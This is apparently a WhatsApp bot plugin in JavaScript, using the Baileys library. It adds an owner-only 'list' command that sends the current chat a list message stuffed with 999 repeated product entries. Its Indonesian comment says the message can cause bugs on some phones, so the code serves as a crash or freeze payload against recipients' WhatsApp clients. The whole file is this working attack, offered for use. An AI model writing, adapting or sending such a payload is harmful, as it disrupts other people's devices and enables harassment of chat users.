// Kadang buat bug di beberapa hp, maka gunakan dengan bijak!!!!!!1


import { generateWAMessageFromContent } from "@adiwajshing/baileys"

let handler  = async (m, { conn }) => {

let arr = []
for (let i = 0; i < 999; i++) arr.push({ productId: '5164304847020057' }) 
  
  let prep = generateWAMessageFromContent(m.chat, {
	listMessage: {
		title: 'Hello World!', description: conn.user.name,
		buttonText: 'iyh', listType: 2,
		sections: [], productListInfo: {
			productSections: [{ title: 'github: Rlxfly', products: arr }],
			headerImage: {
				productId: '5164304847020057', jpegThumbnail: thumb
			},
			businessOwnerJid: '6287845646738@s.whatsapp.net'
		},
		footerText: me,
		contextInfo: null 
	}
}, {})

return conn.relayMessage(m.chat, prep.message, { messageId: prep.key.id })

}

handler.command = /^list$/i
handler.owner = true
export default handler
